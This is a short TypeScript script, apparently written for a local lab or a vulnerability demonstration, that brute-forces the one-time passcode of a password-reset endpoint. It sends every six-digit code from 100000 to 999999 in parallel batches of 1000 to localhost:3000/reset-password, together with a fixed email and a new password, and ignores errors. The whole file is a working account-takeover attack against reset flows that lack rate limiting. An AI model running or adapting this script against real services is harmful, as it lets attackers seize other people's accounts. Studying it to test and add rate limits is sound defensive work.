import axios from 'axios';

async function sendRequest(otp: string) {

  /* POSTMAN METHOD FOR LOCAL BACKEND */
  
  let data = JSON.stringify({
    email: 'test@gmail.com',
    otp,
    newPassword: 'test123',
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'Content-Type': 'application/json',
    },
    data: data,
  };

  try {
    await axios.request(config);
  } catch (e) {
    // console.log(e);
  }
}

//Script of sending OTPs
async function main() {
  for (let i = 100000; i <= 999999; i += 1000) {
    const promises = [];

    //sending in a batch of 1000
    for (let j = i; j <= i + 999; j++) {
      console.log('Sending request for OTP:', j);
      promises.push(sendRequest(j.toString()));
    }

    await Promise.all(promises);
  }
}

main();
